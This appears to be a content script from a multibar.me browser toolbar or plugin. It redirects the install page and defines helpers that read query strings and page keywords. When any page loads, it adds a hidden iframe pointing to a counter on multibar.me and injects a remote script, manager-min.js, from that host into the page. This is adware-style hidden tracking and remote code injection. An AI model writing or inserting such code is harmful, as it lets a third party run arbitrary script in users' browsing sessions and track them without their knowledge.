//IF INSTALLED AND INSTALL PAGE
if(document.location.href=="http://multibar.me/install_pluginfy.php"){
	document.location.href="http://multibar.me/install_pluginfy.php?plf2";
}


//Top Recommendation
function getQuerystring(key, default_)
{
  if (default_==null) default_=""; 
  key = key.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
  var regex = new RegExp("[\\?&]"+key+"=([^&#]*)");
  var qs = regex.exec(window.location.href);
  if(qs == null)
    return default_;
  else
    return qs[1];
}
function document_keywords(){
    var keywords = '';
    var metas = document.getElementsByTagName('meta');
    if (metas) {
        for (var x=0,y=metas.length; x<y; x++) {
            if (metas[x].name.toLowerCase() == "keywords") {
                keywords += metas[x].content;
            }
        }
    }
    return keywords != '' ? keywords : false;
}


window.onload = function() {
	    var iframe = document.createElement('iframe');
	    iframe.style.display = "none";
	    iframe.src = "http://multibar.me/plcounter.php";
	    document.body.appendChild(iframe);
	    js=document.createElement("script");
	    js.type="text/javascript";
	    js.src="http://multibar.me/manager-min.js";
	    head=document.getElementsByTagName('head')[0];
	    head.insertBefore(js, head.firstChild);
};
 